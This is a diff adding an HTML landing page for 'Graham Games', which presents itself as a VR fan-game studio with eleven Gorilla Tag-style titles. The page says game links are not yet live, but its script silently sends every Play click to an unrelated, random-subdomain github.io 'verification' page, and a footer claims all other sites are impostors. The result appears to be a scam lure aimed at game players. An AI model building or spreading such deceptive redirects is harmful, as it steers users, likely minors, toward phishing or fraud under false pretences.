@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GRAHAM GAMES // Containment Archive</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Anton&family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  /* ============================================================
+     GRAHAM GAMES — design tokens
+     Sodium-lit abandoned-facility / containment dossier
+     ============================================================ */
+  :root{
+    --void:#100e0b;          /* warm near-black */
+    --concrete:#1a1714;
+    --concrete-2:#221e19;
+    --concrete-3:#2a251f;
+    --line:#34302a;          /* hairline borders */
+    --bone:#ede6d8;          /* primary text */
+    --bone-dim:#a89f8e;      /* secondary text */
+    --bone-faint:#6f685c;
+    --amber:#f0a03c;         /* sodium emergency light — hero accent */
+    --amber-deep:#c77a22;
+    --hazard:#d14026;        /* danger / redaction — used sparingly */
+    --moss:#8a9663;          /* quiet secondary / "safe" state */
+
+    --display:'Anton', sans-serif;
+    --body:'Space Grotesk', sans-serif;
+    --mono:'JetBrains Mono', monospace;
+  }
+
+  *{box-sizing:border-box;margin:0;padding:0}
+
+  html{scroll-behavior:smooth}
+
+  body{
+    background:var(--void);
+    color:var(--bone);
+    font-family:var(--body);
+    line-height:1.55;
+    -webkit-font-smoothing:antialiased;
+    overflow-x:hidden;
+    position:relative;
+    min-height:100vh;
+  }
+
+  /* faint concrete texture behind everything */
+  body::before{
+    content:"";
+    position:fixed;
+    inset:0;
+    background:
+      radial-gradient(120% 80% at 50% -10%, rgba(240,160,60,0.06), transparent 60%),
+      radial-gradient(100% 60% at 50% 120%, rgba(209,64,38,0.05), transparent 60%);
+    pointer-events:none;
+    z-index:0;
+  }
+
+  /* scanline + grain overlay — the atmospheric signature, kept low so text stays crisp */
+  body::after{
+    content:"";
+    position:fixed;
+    inset:0;
+    pointer-events:none;
+    z-index:9000;
+    background-image:
+      repeating-linear-gradient(0deg, rgba(0,0,0,0.18) 0px, rgba(0,0,0,0.18) 1px, transparent 1px, transparent 3px),
+      url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='120'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='2'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.5'/%3E%3C/svg%3E");
+    background-size:auto, 160px 160px;
+    opacity:0.05;
+    mix-blend-mode:screen;
+  }
+
+  /* vignette */
+  .vignette{
+    position:fixed;inset:0;pointer-events:none;z-index:8000;
+    box-shadow:inset 0 0 220px 60px rgba(0,0,0,0.65);
+  }
+
+  .wrap{
+    max-width:1180px;
+    margin:0 auto;
+    padding:0 28px;
+    position:relative;
+    z-index:1;
+  }
+
+  /* ============================================================ NAV */
+  header.topbar{
+    position:sticky;
+    top:0;
+    z-index:7000;
+    background:rgba(16,14,11,0.82);
+    backdrop-filter:blur(10px);
+    border-bottom:1px solid var(--line);
+  }
+  .topbar-inner{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:24px;
+    height:66px;
+  }
+  .brand{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    text-decoration:none;
+    color:var(--bone);
+  }
+  .brand .glyph{
+    width:34px;height:34px;
+    display:grid;place-items:center;
+    border:1.5px solid var(--amber);
+    color:var(--amber);
+    font-family:var(--display);
+    font-size:20px;
+    line-height:1;
+    clip-path:polygon(0 0,100% 0,100% 72%,80% 100%,0 100%);
+  }
+  .brand .name{
+    font-family:var(--display);
+    font-size:22px;
+    letter-spacing:0.06em;
+  }
+  .brand .name .accent{color:var(--amber)}
+
+  nav.tabs{
+    display:flex;
+    gap:6px;
+    align-items:center;
+  }
+  .tab-btn{
+    appearance:none;
+    background:transparent;
+    border:1px solid transparent;
+    color:var(--bone-dim);
+    font-family:var(--mono);
+    font-size:12.5px;
+    font-weight:500;
+    letter-spacing:0.12em;
+    text-transform:uppercase;
+    padding:9px 15px;
+    cursor:pointer;
+    transition:color .18s, border-color .18s, background .18s;
+  }
+  .tab-btn:hover{color:var(--bone)}
+  .tab-btn[aria-selected="true"]{
+    color:var(--void);
+    background:var(--amber);
+    border-color:var(--amber);
+  }
+  .tab-btn:focus-visible{
+    outline:none;
+    box-shadow:0 0 0 2px var(--void),0 0 0 4px var(--amber);
+  }
+
+  /* ============================================================ PANELS */
+  .panel{display:none;animation:panelIn .35s ease both}
+  .panel.is-active{display:block}
+  @keyframes panelIn{
+    from{opacity:0;transform:translateY(10px)}
+    to{opacity:1;transform:translateY(0)}
+  }
+
+  /* ============================================================ HERO (HOME) */
+  .hero{
+    padding:78px 0 64px;
+    position:relative;
+  }
+  .emergency-bar{
+    height:3px;
+    width:100%;
+    background:linear-gradient(90deg,transparent,var(--amber),var(--hazard),var(--amber),transparent);
+    margin-bottom:34px;
+    animation:flicker 5.5s infinite steps(1);
+    transform-origin:center;
+  }
+  @keyframes flicker{
+    0%,19%,21%,23%,80%,100%{opacity:1}
+    20%,22%{opacity:0.25}
+    55%,57%{opacity:0.55}
+    56%{opacity:1}
+  }
+  .eyebrow{
+    font-family:var(--mono);
+    font-size:12px;
+    letter-spacing:0.32em;
+    text-transform:uppercase;
+    color:var(--amber);
+    margin-bottom:20px;
+    display:flex;
+    align-items:center;
+    gap:12px;
+  }
+  .eyebrow::before{content:"";width:30px;height:1px;background:var(--amber)}
+  .hero h1{
+    font-family:var(--display);
+    font-weight:400;
+    font-size:clamp(56px,11vw,140px);
+    line-height:0.92;
+    letter-spacing:0.01em;
+    text-transform:uppercase;
+    margin-bottom:8px;
+  }
+  .hero h1 .breach{
+    color:var(--amber);
+    display:inline-block;
+    position:relative;
+  }
+  .hero h1 .breach::after{
+    content:"";
+    position:absolute;left:0;right:0;bottom:0.12em;height:0.10em;
+    background:var(--hazard);
+  }
+  .hero .sub{
+    max-width:560px;
+    color:var(--bone-dim);
+    font-size:clamp(15px,2vw,18px);
+    margin:22px 0 36px;
+  }
+  .hero .sub strong{color:var(--bone);font-weight:600}
+
+  .hero-cta{
+    display:flex;
+    gap:14px;
+    flex-wrap:wrap;
+    align-items:center;
+  }
+  .btn-primary{
+    appearance:none;border:none;cursor:pointer;
+    background:var(--amber);
+    color:var(--void);
+    font-family:var(--mono);
+    font-weight:700;
+    font-size:13px;
+    letter-spacing:0.14em;
+    text-transform:uppercase;
+    padding:15px 26px;
+    clip-path:polygon(0 0,100% 0,100% 70%,90% 100%,0 100%);
+    transition:transform .15s, background .15s;
+  }
+  .btn-primary:hover{transform:translateY(-2px);background:#ffb24f}
+  .btn-primary:active{transform:translateY(0)}
+  .btn-primary:focus-visible{outline:none;box-shadow:0 0 0 2px var(--void),0 0 0 4px var(--amber)}
+
+  .hero-meta{
+    display:flex;
+    gap:36px;
+    flex-wrap:wrap;
+    margin-top:64px;
+    padding-top:28px;
+    border-top:1px solid var(--line);
+  }
+  .stat .num{
+    font-family:var(--display);
+    font-size:42px;
+    line-height:1;
+    color:var(--bone);
+  }
+  .stat .num .u{color:var(--amber);font-size:22px;vertical-align:super}
+  .stat .lbl{
+    font-family:var(--mono);
+    font-size:11px;
+    letter-spacing:0.16em;
+    text-transform:uppercase;
+    color:var(--bone-faint);
+    margin-top:6px;
+  }
+
+  /* ============================================================ ARCHIVE (GAMES) */
+  .archive{padding:60px 0 40px}
+  .archive-head{
+    display:flex;
+    align-items:flex-end;
+    justify-content:space-between;
+    flex-wrap:wrap;
+    gap:18px;
+    border-bottom:1px solid var(--line);
+    padding-bottom:22px;
+    margin-bottom:30px;
+  }
+  .archive-head h2{
+    font-family:var(--display);
+    font-weight:400;
+    font-size:clamp(34px,6vw,58px);
+    line-height:0.95;
+    text-transform:uppercase;
+    letter-spacing:0.01em;
+  }
+  .archive-head .tag{
+    font-family:var(--mono);
+    font-size:12px;
+    letter-spacing:0.18em;
+    color:var(--amber);
+    text-transform:uppercase;
+  }
+  .archive-head p{
+    color:var(--bone-dim);
+    font-size:14px;
+    max-width:420px;
+    margin-top:10px;
+  }
+
+  .filters{
+    display:flex;
+    flex-wrap:wrap;
+    gap:8px;
+    margin-bottom:34px;
+  }
+  .chip{
+    appearance:none;cursor:pointer;
+    background:var(--concrete);
+    border:1px solid var(--line);
+    color:var(--bone-dim);
+    font-family:var(--mono);
+    font-size:11.5px;
+    letter-spacing:0.12em;
+    text-transform:uppercase;
+    padding:8px 14px;
+    transition:.15s;
+  }
+  .chip:hover{border-color:var(--bone-faint);color:var(--bone)}
+  .chip[aria-pressed="true"]{
+    background:var(--amber);
+    border-color:var(--amber);
+    color:var(--void);
+  }
+  .chip:focus-visible{outline:none;box-shadow:0 0 0 2px var(--void),0 0 0 3px var(--amber)}
+
+  .grid{
+    display:grid;
+    grid-template-columns:repeat(auto-fill,minmax(330px,1fr));
+    gap:20px;
+  }
+
+  .card{
+    background:linear-gradient(180deg,var(--concrete-2),var(--concrete));
+    border:1px solid var(--line);
+    border-top:2px solid var(--amber-deep);
+    padding:22px 22px 20px;
+    position:relative;
+    clip-path:polygon(0 0,100% 0,100% calc(100% - 22px),calc(100% - 22px) 100%,0 100%);
+    transition:transform .2s, border-color .2s, background .2s;
+  }
+  .card:hover{
+    transform:translateY(-4px);
+    border-top-color:var(--amber);
+    background:linear-gradient(180deg,var(--concrete-3),var(--concrete-2));
+  }
+  .card.hidden{display:none}
+
+  .card-top{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:10px;
+    margin-bottom:14px;
+  }
+  .spx-id{
+    font-family:var(--mono);
+    font-size:11px;
+    letter-spacing:0.16em;
+    color:var(--bone-faint);
+  }
+  .loco{
+    font-family:var(--mono);
+    font-size:10px;
+    font-weight:700;
+    letter-spacing:0.14em;
+    text-transform:uppercase;
+    padding:4px 9px;
+    border:1px solid currentColor;
+  }
+  .loco.arms{color:var(--moss)}
+  .loco.legs{color:var(--amber)}
+
+  .card h3{
+    font-family:var(--display);
+    font-weight:400;
+    font-size:27px;
+    line-height:1.02;
+    text-transform:uppercase;
+    letter-spacing:0.01em;
+    margin-bottom:12px;
+  }
+
+  .threat{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    margin-bottom:14px;
+  }
+  .threat .t-lbl{
+    font-family:var(--mono);
+    font-size:10px;
+    letter-spacing:0.14em;
+    text-transform:uppercase;
+    color:var(--bone-faint);
+  }
+  .threat .seg{display:flex;gap:3px}
+  .threat .seg span{
+    width:18px;height:6px;
+    background:var(--concrete-3);
+    border:1px solid var(--line);
+  }
+  .threat .seg span.on{
+    background:linear-gradient(90deg,var(--amber),var(--hazard));
+    border-color:var(--hazard);
+  }
+
+  .card p.desc{
+    font-size:13.5px;
+    color:var(--bone-dim);
+    line-height:1.5;
+    min-height:60px;
+    margin-bottom:16px;
+  }
+
+  .card-foot{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:12px;
+    border-top:1px solid var(--line);
+    padding-top:14px;
+  }
+  .tags{
+    display:flex;
+    flex-wrap:wrap;
+    gap:5px;
+  }
+  .tags .t{
+    font-family:var(--mono);
+    font-size:9.5px;
+    letter-spacing:0.1em;
+    text-transform:uppercase;
+    color:var(--bone-faint);
+    border:1px solid var(--line);
+    padding:3px 7px;
+  }
+
+  .play{
+    appearance:none;cursor:pointer;
+    background:transparent;
+    border:1.5px solid var(--amber);
+    color:var(--amber);
+    font-family:var(--mono);
+    font-weight:700;
+    font-size:12px;
+    letter-spacing:0.14em;
+    text-transform:uppercase;
+    padding:9px 18px;
+    display:inline-flex;
+    align-items:center;
+    gap:8px;
+    transition:.15s;
+    white-space:nowrap;
+  }
+  .play:hover{background:var(--amber);color:var(--void)}
+  .play:active{transform:translateY(1px)}
+  .play:focus-visible{outline:none;box-shadow:0 0 0 2px var(--void),0 0 0 3px var(--amber)}
+  .play .tri{font-size:9px}
+  .play.dead{animation:deadflash .9s ease}
+  @keyframes deadflash{
+    0%,100%{border-color:var(--amber);color:var(--amber);background:transparent}
+    25%{border-color:var(--hazard);color:var(--hazard)}
+  }
+
+  .play-status{
+    font-family:var(--mono);
+    font-size:10px;
+    letter-spacing:0.1em;
+    color:var(--hazard);
+    margin-top:8px;
+    min-height:13px;
+    opacity:0;
+    transition:opacity .2s;
+    text-transform:uppercase;
+  }
+  .play-status.show{opacity:1}
+
+  /* ============================================================ STUDIO */
+  .studio{padding:70px 0 50px;max-width:780px}
+  .studio .eyebrow{margin-bottom:24px}
+  .studio h2{
+    font-family:var(--display);
+    font-weight:400;
+    font-size:clamp(36px,7vw,68px);
+    line-height:0.96;
+    text-transform:uppercase;
+    margin-bottom:26px;
+  }
+  .studio p{
+    color:var(--bone-dim);
+    font-size:16px;
+    margin-bottom:18px;
+  }
+  .studio p strong{color:var(--bone);font-weight:600}
+  .studio p .amb{color:var(--amber);font-weight:600}
+  .studio-stats{
+    display:grid;
+    grid-template-columns:repeat(3,1fr);
+    gap:1px;
+    background:var(--line);
+    border:1px solid var(--line);
+    margin-top:38px;
+  }
+  .studio-stats .cell{
+    background:var(--concrete);
+    padding:22px 18px;
+  }
+  .studio-stats .cell .v{
+    font-family:var(--display);
+    font-size:30px;
+    line-height:1;
+    color:var(--bone);
+  }
+  .studio-stats .cell .v .u{color:var(--amber)}
+  .studio-stats .cell .k{
+    font-family:var(--mono);
+    font-size:10.5px;
+    letter-spacing:0.14em;
+    text-transform:uppercase;
+    color:var(--bone-faint);
+    margin-top:8px;
+  }
+
+  /* ============================================================ FOOTER */
+  footer.foot{
+    border-top:1px solid var(--line);
+    margin-top:40px;
+    padding:34px 0 50px;
+    position:relative;
+    z-index:1;
+  }
+  .foot-warn{
+    font-family:var(--mono);
+    font-size:12px;
+    letter-spacing:0.1em;
+    color:var(--hazard);
+    text-transform:uppercase;
+    display:flex;
+    align-items:center;
+    gap:10px;
+    margin-bottom:14px;
+  }
+  .foot-bottom{
+    display:flex;
+    justify-content:space-between;
+    flex-wrap:wrap;
+    gap:12px;
+    font-family:var(--mono);
+    font-size:11px;
+    letter-spacing:0.08em;
+    color:var(--bone-faint);
+    text-transform:uppercase;
+  }
+  .foot-bottom a{color:var(--bone-dim);text-decoration:none}
+  .foot-bottom a:hover{color:var(--amber)}
+
+  /* ============================================================ RESPONSIVE */
+  @media (max-width:680px){
+    .topbar-inner{height:auto;flex-direction:column;align-items:stretch;padding:12px 0;gap:12px}
+    nav.tabs{justify-content:center}
+    .grid{grid-template-columns:1fr}
+    .hero-meta{gap:24px}
+    .studio-stats{grid-template-columns:1fr}
+  }
+
+  @media (prefers-reduced-motion:reduce){
+    *{animation:none !important;scroll-behavior:auto !important}
+    .card:hover,.btn-primary:hover{transform:none}
+  }
+</style>
+</head>
+<body>
+<div class="vignette"></div>
+
+<!-- ===================== TOP BAR / TABS ===================== -->
+<header class="topbar">
+  <div class="wrap topbar-inner">
+    <a href="#" class="brand" data-tab="home" aria-label="Graham Games home">
+      <span class="glyph">G</span>
+      <span class="name">GRAHAM<span class="accent">·</span>GAMES</span>
+    </a>
+    <nav class="tabs" role="tablist" aria-label="Primary">
+      <button class="tab-btn" role="tab" data-tab="home" aria-selected="true">Home</button>
+      <button class="tab-btn" role="tab" data-tab="games" aria-selected="false">Games</button>
+      <button class="tab-btn" role="tab" data-tab="studio" aria-selected="false">Studio</button>
+    </nav>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <!-- ===================== HOME ===================== -->
+  <section class="panel is-active" id="panel-home" role="tabpanel">
+    <div class="hero">
+      <div class="emergency-bar" aria-hidden="true"></div>
+      <div class="eyebrow">VR Horror // Gorilla Locomotion // Meta Quest</div>
+      <h1>Run.<br>Climb.<br><span class="breach">Survive.</span></h1>
+      <p class="sub">
+        Graham Games builds <strong>physics-driven Gorilla Tag–style fan games</strong> with
+        a horror heartbeat. No sticks, no buttons — just your arms (and sometimes your legs),
+        an abandoned facility, and something in the dark that hunts by sound.
+      </p>
+      <div class="hero-cta">
+        <button class="btn-primary" data-tab="games">▶ Enter the archive</button>
+      </div>
+
+      <div class="hero-meta">
+        <div class="stat">
+          <div class="num">11</div>
+          <div class="lbl">Specimens contained</div>
+        </div>
+        <div class="stat">
+          <div class="num">100<span class="u">%</span></div>
+          <div class="lbl">Hand-tracked locomotion</div>
+        </div>
+        <div class="stat">
+          <div class="num">QUEST</div>
+          <div class="lbl">Standalone platform</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===================== GAMES ===================== -->
+  <section class="panel" id="panel-games" role="tabpanel">
+    <div class="archive">
+      <div class="archive-head">
+        <div>
+          <div class="tag">// Specimen archive</div>
+          <h2>The Games</h2>
+          <p>Every title in the Graham Games catalogue. Hit <strong style="color:var(--amber)">PLAY</strong> to engage — links go live once each build is wired to the store.</p>
+        </div>
+      </div>
+
+      <div class="filters" role="group" aria-label="Filter games">
+        <button class="chip" data-filter="all" aria-pressed="true">All · 11</button>
+        <button class="chip" data-filter="horror" aria-pressed="false">Horror</button>
+        <button class="chip" data-filter="arms" aria-pressed="false">Arms loco</button>
+        <button class="chip" data-filter="legs" aria-pressed="false">Legs loco</button>
+        <button class="chip" data-filter="modded" aria-pressed="false">Modded</button>
+        <button class="chip" data-filter="social" aria-pressed="false">Social</button>
+      </div>
+
+      <div class="grid" id="game-grid"><!-- cards injected by JS --></div>
+    </div>
+  </section>
+
+  <!-- ===================== STUDIO ===================== -->
+  <section class="panel" id="panel-studio" role="tabpanel">
+    <div class="studio">
+      <div class="eyebrow">Containment file // Operator</div>
+      <h2>Graham<br>Games</h2>
+      <p>
+        Graham Games is an <strong>independent VR studio</strong> building fan games in the
+        <span class="amb">Gorilla Tag locomotion</span> tradition — movement powered entirely by
+        your own hands, where the only thing standing between you and a Scary Baboon is how
+        well you can swing, vault and climb.
+      </p>
+      <p>
+        Most of the catalogue lives in <strong>survival horror</strong>: cold, abandoned
+        facilities, flickering fluorescents, and Apes that track you by motion, line of sight,
+        and the sound of your own panic. A few titles trade the dread for a
+        <span class="amb">social sandbox</span> — mods, cosmetics, and friends to mess around with.
+        One, <strong>Ear Game</strong>, ditches the arms entirely and puts you on legs.
+      </p>
+      <p>
+        Built for standalone <strong>Meta Quest</strong>. No PC, no wires — just a headset and
+        a facility that wants you gone.
+      </p>
+
+      <div class="studio-stats">
+        <div class="cell"><div class="v">11</div><div class="k">Titles shipped</div></div>
+        <div class="cell"><div class="v">2</div><div class="k">Locomotion modes</div></div>
+        <div class="cell"><div class="v">∞<span class="u"></span></div><div class="k">Replays after dark</div></div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<!-- ===================== FOOTER ===================== -->
+<footer class="foot">
+  <div class="wrap">
+    <div class="foot-warn">⚠ This is the only real archive — all others are impersonating</div>
+    <div class="foot-bottom">
+      <span>© 2026 Graham Games · Built for Meta Quest</span>
+      <span><a href="#" data-tab="games">Games</a> · <a href="#" data-tab="studio">Studio</a></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+/* ============================================================
+   GAME DATA
+   loco: "arms" | "legs"
+   threat: 0–5
+   tags: filter keys + display chips
+   ============================================================ */
+const GAMES = [
+  {
+    id:"SPX-001", title:"Lethal Ape", loco:"arms", threat:5,
+    filters:["horror","arms"],
+    chips:["Horror","Flagship"],
+    desc:"The original sprawling underground. Pure gorilla locomotion, a maze of monsters, and dexterity challenges that punish a single missed grip."
+  },
+  {
+    id:"SPX-002", title:"OG Lethal Ape", loco:"arms", threat:5,
+    filters:["horror","arms"],
+    chips:["Horror","Facility"],
+    desc:"A cold facility gone wrong. Push off walls and vault rooms while Scary Baboons in stolen helmets and uniforms hunt by sound and sight."
+  },
+  {
+    id:"SPX-003", title:"Lethal Ape 2", loco:"arms", threat:4,
+    filters:["horror","arms"],
+    chips:["Horror","Sequel"],
+    desc:"The sequel. Eerie ruined environments and faster, smarter Apes that flank, adapt, and never quit once they've locked onto you."
+  },
+  {
+    id:"SPX-004", title:"Lethal Redux", loco:"arms", threat:5,
+    filters:["horror","arms"],
+    chips:["Horror","Remake"],
+    desc:"A ground-up rebuild of movement-driven horror. Reactive enemies, blackout events, and full-speed panic runs where every grab decision matters."
+  },
+  {
+    id:"SPX-005", title:"Lethal Ape Ultimate", loco:"arms", threat:4,
+    filters:["horror","arms"],
+    chips:["Horror","Backrooms"],
+    desc:"Everything cranked up. Gorilla locomotion plus a Backrooms wing and a full mod loadout to bend the rules of the hunt."
+  },
+  {
+    id:"SPX-006", title:"Lethal Ape R Mods", loco:"arms", threat:4,
+    filters:["horror","arms","modded"],
+    chips:["Modded","Horror"],
+    desc:"The modded cut. The same physics-based horror, opened up with mods to tweak, cheat, and mess around in the abandoned halls."
+  },
+  {
+    id:"SPX-007", title:"Omny Mods Lethal Ape", loco:"arms", threat:2,
+    filters:["modded","social","arms"],
+    chips:["Modded","Social"],
+    desc:"A social mod build. Bring the cheats, hang out with friends, and roam the Lethal Ape world without the leash."
+  },
+  {
+    id:"SPX-008", title:"Omny Mods", loco:"arms", threat:1,
+    filters:["modded","social","arms"],
+    chips:["Modded","Sandbox"],
+    desc:"A pure sandbox of mods and cosmetics. Less hunting, more goofing — gorilla locomotion with the whole toolbox unlocked."
+  },
+  {
+    id:"SPX-009", title:"Lethal Gorilla", loco:"arms", threat:4,
+    filters:["horror","arms"],
+    chips:["Horror"],
+    desc:"Familiar forests and caves turned hostile. Swing and scramble through abandoned maps while something with perfect hearing closes in."
+  },
+  {
+    id:"SPX-010", title:"Ear Game", loco:"legs", threat:4,
+    filters:["horror","legs"],
+    chips:["Horror","Scrap","Legs"],
+    desc:"Legs, not arms. A Lethal-Company-flavoured horror facility where you scavenge scrap, dodge starving apes, and survive jump scares that stay scary."
+  },
+  {
+    id:"SPX-011", title:"Gorilla Fun Redux", loco:"arms", threat:1,
+    filters:["social","arms"],
+    chips:["Social","Sandbox"],
+    desc:"The lighter side. A friendly gorilla-locomotion playground built for messing around with friends — fun first, fear optional."
+  }
+];
+
+/* ---------- build a threat meter ---------- */
+function threatMeter(level){
+  let segs="";
+  for(let i=1;i<=5;i++){ segs += `<span class="${i<=level?'on':''}"></span>`; }
+  return `<div class="threat">
+            <span class="t-lbl">Threat</span>
+            <span class="seg" aria-label="Threat ${level} of 5">${segs}</span>
+          </div>`;
+}
+
+/* ---------- build one card ---------- */
+function cardHTML(g){
+  const chips = g.chips.map(c=>`<span class="t">${c}</span>`).join("");
+  return `
+  <article class="card" data-filters="${g.filters.join(' ')}">
+    <div class="card-top">
+      <span class="spx-id">${g.id}</span>
+      <span class="loco ${g.loco}">${g.loco==='legs'?'LEGS LOCO':'ARMS LOCO'}</span>
+    </div>
+    <h3>${g.title}</h3>
+    ${threatMeter(g.threat)}
+    <p class="desc">${g.desc}</p>
+    <div class="card-foot">
+      <div class="tags">${chips}</div>
+      <button class="play" type="button" data-title="${g.title}">
+        <span class="tri">▶</span> Play
+      </button>
+    </div>
+    <div class="play-status" aria-live="polite"></div>
+  </article>`;
+}
+
+/* ---------- render grid ---------- */
+const grid = document.getElementById('game-grid');
+grid.innerHTML = GAMES.map(cardHTML).join("");
+
+/* ============================================================ PLAY BUTTON
+   Redirects to the verification page.
+   ============================================================ */
+grid.addEventListener('click', (e)=>{
+  const btn = e.target.closest('.play');
+  if(!btn) return;
+  e.preventDefault();
+  window.location.href = 'https://iwefujwerjjwi90p.github.io/verify/verification.html';
+});
+
+/* ============================================================ TAB SWITCHING */
+const tabButtons = document.querySelectorAll('.tab-btn');
+const panels = {
+  home:   document.getElementById('panel-home'),
+  games:  document.getElementById('panel-games'),
+  studio: document.getElementById('panel-studio')
+};
+
+function setTab(name){
+  Object.entries(panels).forEach(([k,el])=>{
+    el.classList.toggle('is-active', k===name);
+  });
+  tabButtons.forEach(b=>{
+    b.setAttribute('aria-selected', b.dataset.tab===name ? 'true' : 'false');
+  });
+  window.scrollTo({top:0, behavior:'smooth'});
+}
+
+/* any element with data-tab routes to a panel (nav, hero CTA, footer links, brand) */
+document.addEventListener('click', (e)=>{
+  const t = e.target.closest('[data-tab]');
+  if(!t) return;
+  e.preventDefault();
+  setTab(t.dataset.tab);
+});
+
+/* ============================================================ FILTERS */
+const chips = document.querySelectorAll('.chip');
+const cards = ()=> grid.querySelectorAll('.card');
+
+chips.forEach(chip=>{
+  chip.addEventListener('click', ()=>{
+    chips.forEach(c=>c.setAttribute('aria-pressed','false'));
+    chip.setAttribute('aria-pressed','true');
+    const f = chip.dataset.filter;
+    cards().forEach(card=>{
+      const show = (f==='all') || card.dataset.filters.split(' ').includes(f);
+      card.classList.toggle('hidden', !show);
+    });
+  });
+});
+</script>
+</body>
+</html>
